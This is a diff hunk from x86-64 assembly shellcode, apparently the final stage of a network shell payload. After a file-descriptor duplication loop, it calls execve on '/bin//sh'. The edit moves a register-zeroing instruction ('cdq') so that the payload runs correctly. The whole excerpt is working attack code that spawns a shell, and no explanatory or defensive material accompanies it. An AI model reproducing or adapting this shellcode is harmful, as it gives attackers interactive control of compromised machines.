@@ -71,14 +71,14 @@ dup_loop64:
     
     ; step 4, execute /bin/sh
     ; execv("/bin//sh", 0, 0);
+    cdq
     push    rdx
     pop     rsi              ; rsi=0
     push    rdx              ; zero terminator
     mov     rcx, '/bin//sh'
     push    rcx
     push    rsp
-    pop     rdi
-    cdq                      ; rdx = 0    
+    pop     rdi    
     mov     al, 59           ; rax = sys_execve
     syscall
     
